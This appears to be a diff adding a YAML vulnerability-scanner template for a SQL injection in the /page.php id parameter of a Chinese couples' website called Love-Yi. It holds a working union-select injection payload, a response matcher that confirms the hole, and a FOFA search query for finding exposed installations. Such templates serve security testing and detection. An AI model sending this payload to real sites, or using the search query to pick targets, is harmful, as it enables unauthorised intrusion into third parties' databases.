@@ -1,0 +1,16 @@
+id: poc-yaml-ki-love-yi-page-id-sqli
+info:
+  name: Love-Yi情侣网站 /page.php SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Love-Yi情侣网站
+  fofa: \"img/like.svg\" && \"2022\" && country=\"CN\"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /page.php?id=-6'+union+select+1,md5({{.t1}}),3,4,5+--+
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
